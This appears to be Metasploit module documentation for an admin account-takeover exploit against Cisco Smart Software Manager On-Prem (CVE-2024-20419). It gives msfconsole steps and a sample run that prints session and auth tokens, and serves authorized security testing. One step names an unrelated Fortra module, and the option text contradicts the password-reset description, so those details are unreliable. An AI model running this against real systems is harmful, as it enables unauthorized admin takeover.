## Vulnerable Application

This module exploits an account takeover vulnerability in Cisco SSM On-Prem <= 8-202206 (CVE-2024-20419), by changing the password of the
admin user.

The vendor published an advisory [here]
(https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-cssm-auth-sLw3uhUy). The original research blog
is available [here](https://www.0xpolar.com/blog/CVE-2024-20419).

## Testing

The software can be obtained from the [vendor](https://software.cisco.com/download/home/286285506/type/286326948/release/9-202407).

Deploy it by following the vendor's [installation guide]
(https://www.cisco.com/web/software/286285517/152313/Smart_Software_Manager_On-Prem_8-202006_Installation_Guide.pdf).

**Successfully tested on**

- Cisco Smart Software Manager v8-202206.

## Verification Steps

1. Deploy Cisco Smart Software Manager v8-202206
2. Start `msfconsole`
3. `use auxiliary/admin/http/fortra_filecatalyst_workflow_sqli`
4. `set RHOSTS <IP>`
5. `set NEW_PASSWORD <password>`
6. `run`
7. A new password should have been set for the admin account.

## Options

### NEW_PASSWORD
Password to be used when creating a new user with admin privileges.

## Scenarios

Running the module against Smart Software Manager v8-202206 should result in an output
similar to the following:

```
msf6 > use auxiliary/admin/http/cisco_ssm_onprem_account 
msf6 auxiliary(admin/http/cisco_ssm_onprem_account) > set RHOSTS 192.168.137.200
msf6 auxiliary(admin/http/cisco_ssm_onprem_account) > set SSL true
msf6 auxiliary(admin/http/cisco_ssm_onprem_account) > exploit 
[*] Running module against 192.168.137.200

[*] Starting workflow...
[+] Server reachable.
[*] xsrf_token: B%2BxNjt72KTh%2BW%2FYhUkSFpTKE5uM1NUkZdBMkle5C1DDpr9P9lPyPDN556BImuPHfSsdy4W4blO8R%2BvtX%2FLK%2B1A%3D%3D
[*] xsrf_token: B+xNjt72KTh+W/YhUkSFpTKE5uM1NUkZdBMkle5C1DDpr9P9lPyPDN556BImuPHfSsdy4W4blO8R+vtX/LK+1A==
[*] _lic_engine_session: f517481befa8b1a7cddcb1d755b8163c
[+] Server reachable.
[*] auth_token: 21bf4695d594af3bd5f0f07db2ce8f09f29abe6f9295e2649e3fa5f266ada2a1
[+] Server reachable.
[*] Auxiliary module execution completed
```
